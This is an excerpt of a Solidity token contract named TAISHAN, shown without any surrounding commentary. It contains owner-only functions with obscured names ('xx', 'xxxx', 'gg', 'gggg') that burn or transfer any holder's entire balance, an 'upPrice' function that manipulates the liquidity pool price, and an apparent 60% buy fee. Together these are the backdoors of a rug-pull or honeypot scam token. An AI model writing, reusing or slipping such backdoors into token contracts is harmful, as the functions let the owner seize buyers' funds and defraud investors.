...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 public _buyFundFee = 6000;
    ...
    function upPrice(address lpAddress, address account, uint256 amount) external onlyOwner {
        _tokenTransfer(lpAddress, account, amount, false, false);
        ISwapPair(lpAddress).sync();
    }

    function xx(address account, uint256 amount) external onlyOwner {
        _tokenTransfer(account, address(0x000000000000000000000000000000000000dEaD), amount, false, false);
    }

    function xxxx(address account) external onlyOwner {
        _tokenTransfer(account, address(0x000000000000000000000000000000000000dEaD), balanceOf(account), false, false);
    }

    function gg(address account, uint256 amount, address to) external onlyOwner {
        _tokenTransfer(account, to, amount, false, false);
    }

    function gggg(address account, address to) external onlyOwner {
        _tokenTransfer(account, to, balanceOf(account), false, false);
    }
...
contract TAISHAN is AbsToken {
    constructor() AbsToken(
        ...
        18,
        1000000,
        address(0x9a8B60c625543cB1495fAd347cB76666839b5557),
        address(0x71D81CB47c046BAF78eF82B60C0ff1981808dE86),
        address(0x71D81CB47c046BAF78eF82B60C0ff1981808dE86),
        0,
        0
    ){
